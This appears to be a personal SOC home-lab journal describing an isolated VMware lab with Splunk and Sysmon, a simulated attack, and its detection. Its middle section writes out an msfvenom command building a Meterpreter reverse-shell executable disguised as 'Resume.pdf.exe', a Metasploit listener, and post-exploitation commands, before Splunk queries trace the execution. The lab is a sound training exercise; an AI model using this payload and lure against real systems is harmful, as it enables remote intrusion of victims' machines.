# SOC-HomeLab-Malware-Analysis
Created by: Ben Holomah
Goal: Land a Junior SOC analyst role by May 2026
This is a "journal entry" of my process creating my first SOC home lab. My purpose in creating it is to help me gain and apply technical skills that I'd be using as a SOC analyst. I want to document the journey, displaying my desire to sharpen my skills and acquire experience using tools used in the field.

---

# SOC Home Lab — Malware Analysis & Detection

## Environment Baseline
- **Hypervisor:** VMware
- **SIEM:** Splunk 10.2.1
- **Endpoints:** Windows 11, Kali Linux

---

## Baseline Setup
**Date:** January 21, 2026

I installed Windows 11 onto my VM. During the installation process I opted for a Local Account via the Offline Account/Limited Experience path. This provides a cleaner lab environment by reducing Microsoft cloud sync services and related background noise in logs.

I confirmed administrator privileges by running:
```
net user %username%
```

[SCREENSHOT: Command prompt showing net user output confirming admin status]

---

## Network Configuration

I created a LAN segment in VMware named "LabNetwork" to isolate the lab environment from my host machine and the internet.

| Network Mode | Internet Access | Use Case |
|---|---|---|
| NAT | Yes | Testing tools |
| Bridged | Yes | Testing tools |
| Host-Only | No | Malware analysis |
| LAN Segment | No | Isolated lab communication |

**Windows 11 — 192.168.20.10**
1. Opened Network & Internet Settings
2. Navigated to Change Adapter Options
3. Right-clicked Ethernet0 → Properties → IPv4 → Properties
4. Assigned static IP: 192.168.20.10, Subnet Mask: 255.255.255.0
5. Confirmed with ipconfig

[SCREENSHOT: ipconfig output showing 192.168.20.10]

**Kali Linux — 192.168.20.11**
1. Right-clicked ethernet icon → Edit Connections
2. Navigated to IPv4 Settings tab
3. Changed method from Automatic DHCP to Manual
4. Assigned static IP: 192.168.20.11, Subnet Mask: 255.255.255.0
5. Confirmed with ifconfig

[SCREENSHOT: ifconfig output showing 192.168.20.11]

**Troubleshooting: Ping Failures**

Initial pings failed due to Windows Firewall blocking ICMP traffic. Resolved by running:
```
New-NetFirewallRule -DisplayName "Allow ICMPv4" -Protocol ICMPv4 -IcmpType 8 -Enabled True -Action Allow
```

[SCREENSHOT: Successful ping from Kali to Windows 11]

---

## Installing Splunk

After installation I configured Splunk to ingest Windows Event Logs via Add Data → Monitor → Local Event Logs and selected Application, Security, and System.

[SCREENSHOT: Splunk Add Data review screen showing Application, Security, System selected]

---

## Installing Sysmon

To enrich endpoint logging I installed Sysmon using the SwiftOnSecurity configuration for detailed visibility into process creation, network connections, and file activity.
```
.\Sysmon64.exe -accepteula -i sysmonconfig.xml
```

[SCREENSHOT: PowerShell showing Sysmon64 service running]

---

## Reconnaissance — Nmap Scan

From Kali I ran an aggressive scan against the Windows 11 target:
```
nmap -A 192.168.20.10 -Pn
```

Open ports discovered:
- 135 — Microsoft RPC
- 139 — NetBIOS
- 445 — SMB
- 3389 — RDP
- 8000/8089 — Splunk

The -A flag enables aggressive scanning including OS detection and service versioning. The -Pn flag skips host discovery.

[SCREENSHOT: Nmap scan results showing open ports]

---

## Enabling RDP

Enabled Remote Desktop on Windows 11 via Settings → System → Remote Desktop.

[SCREENSHOT: Windows 11 Remote Desktop settings showing RDP enabled on port 3389]

---

## Generating Malware with Msfvenom
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f exe -o Resume.pdf.exe
```

- -p windows/x64/meterpreter_reverse_tcp — Meterpreter reverse TCP payload
- LHOST=192.168.20.11 — payload calls back to the Kali machine
- LPORT=4444 — listening port
- -f exe — outputs as a Windows executable
- -o Resume.pdf.exe — filename mimics a PDF to simulate social engineering

Note: Windows Defender was disabled for the purpose of generating telemetry in this lab environment.

[SCREENSHOT: Msfvenom command output showing payload generated]

---

## Setting Up the Metasploit Listener
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.20.11
set lport 4444
run
```

[SCREENSHOT: Metasploit handler running and waiting for connection]

---

## Executing the Payload

The payload was transferred to the Windows 11 machine and executed. With file extensions hidden the file appears to be a PDF, which is a common social engineering technique. After enabling file extensions the .exe extension becomes visible.

I confirmed the connection by running:
```
netstat -anob
```

I located an established connection back to the Kali machine on port 4444.

[SCREENSHOT: netstat output showing established connection to 192.168.20.11:4444]

---

## Post-Exploitation

After a Meterpreter session was established I dropped into a shell and ran:
```
shell
net user
net localgroup
ipconfig
```

[SCREENSHOT: Kali terminal showing Meterpreter session and post-exploitation commands]

---

## Detection in Splunk

I created a dedicated index called endpoint to ingest Sysmon data and searched for evidence of the attack.

Searching for malware execution:
```
index=endpoint Resume.pdf.exe
```

[SCREENSHOT: Splunk results showing Resume.pdf.exe execution]

Pivoting on process GUID to trace activity:
```
index=endpoint {process_guid}
| table _time, ParentImage, Image, CommandLine
```

This revealed explorer.exe spawning Resume.pdf.exe, a classic indicator of a user executing a malicious file.

[SCREENSHOT: Splunk table showing ParentImage, Image, and CommandLine]

---

## Conclusion

This project gave me hands-on experience with both offensive and defensive security. On the blue team side I configured a SIEM, ingested endpoint telemetry, and identified malicious activity through log analysis. On the red team side I used Nmap, Msfvenom, and Metasploit to simulate a realistic attack chain. The combination of both perspectives deepened my understanding of how attacks are executed and how defenders can detect them.
